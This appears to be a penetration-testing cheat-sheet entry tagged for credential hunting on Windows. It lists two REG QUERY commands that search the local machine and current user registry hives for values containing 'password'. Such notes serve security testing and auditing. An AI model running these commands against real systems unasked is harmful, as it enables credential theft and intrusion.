# pwsh

#plateform/windows #target/local #cat/CREDENTIAL-ACCESS/CREDS_HUNT #tag/powershell 


## registry - Search password
```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
```
